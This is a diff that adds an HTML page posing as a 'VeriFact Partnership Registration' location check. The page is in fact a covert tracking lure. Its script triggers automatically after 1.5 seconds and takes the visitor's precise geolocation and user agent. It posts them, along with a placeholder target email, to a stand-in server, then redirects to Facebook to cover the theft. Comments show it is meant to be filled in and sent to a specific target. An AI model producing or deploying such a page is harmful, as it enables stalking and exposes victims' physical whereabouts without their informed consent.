@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VeriFact Partnership Registration</title>
+    <style>
+        body { background: #0f0f0f; color: #fff; font-family: Arial; text-align: center; padding: 50px; }
+        .btn { background: #00cc00; color: black; padding: 15px 40px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>Partnership Verification</h2>
+    <p>Please verify your location to complete registration.</p>
+    <button class="btn" onclick="getLocation()">Verify Location</button>
+
+    <script>
+        function getLocation() {
+            document.querySelector('button').innerHTML = "Verifying...";
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        // Send to your server
+                        fetch('https://yourdomain.com/log.php', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                timestamp: new Date().toISOString(),
+                                userAgent: navigator.userAgent,
+                                email: "target@email.com"   // you can add this later
+                            })
+                        }).then(() => {
+                            window.location = "https://www.facebook.com";
+                        });
+                    },
+                    function() {
+                        // Fallback if denied
+                        window.location = "https://www.facebook.com";
+                    }
+                );
+            }
+        }
+
+        // Auto trigger after 1.5 seconds
+        setTimeout(getLocation, 1500);
+    </script>
+</body>
+</html>
